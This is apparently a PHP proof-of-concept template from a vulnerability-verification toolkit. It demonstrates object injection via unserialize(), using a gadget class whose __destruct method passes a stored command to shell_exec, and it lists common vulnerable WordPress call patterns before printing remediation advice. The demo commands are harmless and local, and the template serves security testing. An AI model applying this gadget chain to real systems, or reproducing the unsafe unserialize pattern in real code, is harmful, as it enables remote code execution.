<?php
/**
 * PoC Template: PHP Object Injection
 * 
 * Vulnerability: Unsafe unserialize() with attacker-controlled data
 * Common in: WordPress options, user meta, transients
 * 
 * Detection: Look for unserialize() with untrusted input ($_GET, $_POST, $_COOKIE)
 * 
 * Metadata:
 * - Category: {{CATEGORY}}
 * - Severity: {{SEVERITY}}
 * - File: {{FILE}}
 * - Line: {{LINE}}
 */

// VULNERABLE CODE LOCATION
// {{VULNERABLE_CODE}}

echo "=== PHP Object Injection PoC ===\n\n";

// Step 1: Define exploit class with magic methods
class ZeroKitExploitChain {
    private $command;
    private $output_file;
    
    public function __construct($cmd = 'echo ZEROKIT_OBJECT_INJECTION') {
        $this->command = $cmd;
        $this->output_file = '/tmp/zerokit_object_injection_proof.txt';
        echo "[*] Exploit object constructed with command: $cmd\n";
    }
    
    public function __destruct() {
        // Magic method automatically called when object is destroyed
        echo "[*] __destruct() magic method triggered\n";
        
        // Execute command via system()
        $output = shell_exec($this->command . ' > ' . $this->output_file . ' 2>&1');
        
        if (file_exists($this->output_file)) {
            echo "[*] Command executed successfully\n";
        }
    }
    
    public function __wakeup() {
        // Called during unserialization
        echo "[*] __wakeup() magic method triggered\n";
    }
    
    public function __toString() {
        // Can be triggered via string operations
        return $this->command;
    }
}

// Step 2: Generate serialized payload
$exploit_object = new ZeroKitExploitChain('echo "OBJECT_INJECTION_CONFIRMED" && date');
$serialized_payload = serialize($exploit_object);

echo "[*] Generated serialized payload:\n";
echo substr($serialized_payload, 0, 100) . "...\n\n";

// Step 3: Simulate vulnerable unserialize() call
// Common WordPress patterns:
// - maybe_unserialize($_COOKIE['wp_settings'])
// - unserialize(get_option('plugin_settings'))
// - unserialize($_POST['user_data'])

echo "[*] Simulating vulnerable unserialize() call...\n";

// Clean up previous test
@unlink('/tmp/zerokit_object_injection_proof.txt');

try {
    // VULNERABILITY: Unserializing untrusted data
    $restored_object = unserialize($serialized_payload);
    
    // Object's __destruct will trigger when script ends or variable is unset
    unset($restored_object);
    
} catch (Exception $e) {
    echo "[!] Unserialization failed: " . $e->getMessage() . "\n";
    exit(1);
}

// Step 4: Verify exploitation
sleep(1); // Give __destruct time to execute

if (file_exists('/tmp/zerokit_object_injection_proof.txt')) {
    $proof_content = file_get_contents('/tmp/zerokit_object_injection_proof.txt');
    
    echo "\n=== VERIFICATION ===\n";
    echo "[✓] Object Injection CONFIRMED\n";
    echo "[✓] Arbitrary code execution via magic methods\n";
    echo "[✓] Proof file created with content:\n";
    echo "    " . trim($proof_content) . "\n\n";
    
    echo "=== IMPACT ===\n";
    echo "- Remote Code Execution (RCE)\n";
    echo "- Can chain with other gadgets for more sophisticated attacks\n";
    echo "- Common in WordPress plugins using unserialize() with user input\n\n";
    
    echo "=== RECOMMENDATION ===\n";
    echo "1. Never unserialize() untrusted data\n";
    echo "2. Use json_decode() instead of serialize/unserialize\n";
    echo "3. If serialization is required, use HMAC signature validation\n";
    echo "4. Audit all calls to: unserialize(), maybe_unserialize()\n";
    
    // Cleanup
    @unlink('/tmp/zerokit_object_injection_proof.txt');
    
    exit(0); // SUCCESS
    
} else {
    echo "\n[✗] Object Injection verification failed\n";
    echo "[✗] Expected proof file not found\n";
    exit(1); // FAILURE
}
?>
